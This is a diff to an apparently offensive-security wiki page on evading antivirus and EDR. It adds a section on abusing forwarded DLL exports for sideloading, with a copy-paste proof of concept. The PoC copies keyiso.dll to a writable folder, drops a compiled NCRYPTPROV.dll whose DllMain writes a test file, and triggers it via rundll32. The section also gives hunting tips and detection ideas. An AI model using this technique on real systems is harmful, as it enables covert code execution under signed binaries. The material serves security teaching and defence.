@@ -121,6 +121,69 @@ Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the
 > [!TIP]
 > I **highly recommend** you watch [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) about DLL Sideloading and also [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) to learn more about what we've discussed more in-depth.
 
+### Abusing Forwarded Exports (ForwardSideLoading)
+
+Windows PE modules can export functions that are actually "forwarders": instead of pointing to code, the export entry contains an ASCII string of the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:
+
+- Load `TargetDll` if not already loaded
+- Resolve `TargetFunc` from it
+
+Key behaviors to understand:
+- If `TargetDll` is a KnownDLL, it is supplied from the protected KnownDLLs namespace (e.g., ntdll, kernelbase, ole32).
+- If `TargetDll` is not a KnownDLL, the normal DLL search order is used, which includes the directory of the module that is doing the forward resolution.
+
+This enables an indirect sideloading primitive: find a signed DLL that exports a function forwarded to a non-KnownDLL module name, then co-locate that signed DLL with an attacker-controlled DLL named exactly as the forwarded target module. When the forwarded export is invoked, the loader resolves the forward and loads your DLL from the same directory, executing your DllMain.
+
+Example observed on Windows 11:
+
+```
+keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
+```
+
+`NCRYPTPROV.dll` is not a KnownDLL, so it is resolved via normal search order.
+
+PoC (copy-paste):
+1) Copy the signed system DLL to a writable folder
+```
+copy C:\Windows\System32\keyiso.dll C:\test\
+```
+2) Drop a malicious `NCRYPTPROV.dll` in the same folder. A minimal DllMain is enough to get code execution; you do not need to implement the forwarded function to trigger DllMain.
+```c
+// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
+#include <windows.h>
+BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
+    if (reason == DLL_PROCESS_ATTACH){
+        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
+    }
+    return TRUE;
+}
+```
+3) Trigger the forward with a signed LOLBin:
+```
+rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
+```
+
+Observed behavior:
+- rundll32 (signed) loads the side-by-side `keyiso.dll` (signed)
+- While resolving `KeyIsoSetAuditingInterface`, the loader follows the forward to `NCRYPTPROV.SetAuditingInterface`
+- The loader then loads `NCRYPTPROV.dll` from `C:\test` and executes its `DllMain`
+- If `SetAuditingInterface` is not implemented, you'll get a "missing API" error only after `DllMain` has already run
+
+Hunting tips:
+- Focus on forwarded exports where the target module is not a KnownDLL. KnownDLLs are listed under `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
+- You can enumerate forwarded exports with tooling such as:
+```
+dumpbin /exports C:\Windows\System32\keyiso.dll
+# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
+```
+- See the Windows 11 forwarder inventory to search for candidates: https://hexacorn.com/d/apis_fwd.txt
+
+Detection/defense ideas:
+- Monitor LOLBins (e.g., rundll32.exe) loading signed DLLs from non-system paths, followed by loading non-KnownDLLs with the same base name from that directory
+- Alert on process/module chains like: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` under user-writable paths
+- Enforce code integrity policies (WDAC/AppLocker) and deny write+execute in application directories
+
 ## [**Freeze**](https://github.com/optiv/Freeze)
 
 `Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`
@@ -511,7 +574,7 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
 
 ### Compiling our own reverse shell
 
-https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15
+https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15
 
 #### First C# Revershell
 
@@ -760,5 +823,8 @@ This case study demonstrates how purely client-side trust decisions and simple s
 - [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
 - [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
 - [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
+- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
+- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
+- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
 
 {{#include ../banners/hacktricks-training.md}}
